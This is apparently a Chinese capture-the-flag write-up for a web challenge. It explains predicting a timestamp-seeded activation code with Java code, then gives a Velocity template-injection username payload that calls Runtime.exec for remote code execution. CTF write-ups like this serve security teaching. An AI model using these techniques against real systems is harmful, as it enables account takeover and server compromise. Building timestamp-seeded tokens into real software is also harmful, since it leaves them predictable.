# Unfinished Website

**Author:** tel

**Difficulty:** Hard

**Category:** Web

## 题目描述

开发到一半的网站，很多功能都没完全弄好诶（包括前端，确信），有漏洞，快挖，不然一会就修好了

## 题目解析

**暴露端口：`8080`**

使用时间戳来生成激活码，可以发注册账号请求，获取当前的时间戳，然后根据时间戳生成激活码，直接激活，然后进行登录

> java 中 `System.currentTimeMillis()` 与 python 中 `int(time.time()*1000)` 一样，可以写 python 来请求，同时记录当时的时间戳

```java
public static void main(String[] args) {
    Long time = Long.valueOf(1680932374497L);

    Random random = new Random(time);
    String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    int length = 30;
    StringBuilder sb = new StringBuilder(length);
    for (int i = 0; i < length; i++) {
        int randomIndex = random.nextInt(characters.length());
        sb.append(characters.charAt(randomIndex));
    }
    System.out.println(sb.toString());

}
```

登录之后，使用的是 `Velocity` 模板渲染，渲染 `username` 进模板里面，注册一个 `username` 为 `#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")` 可以弹计算器 RCE
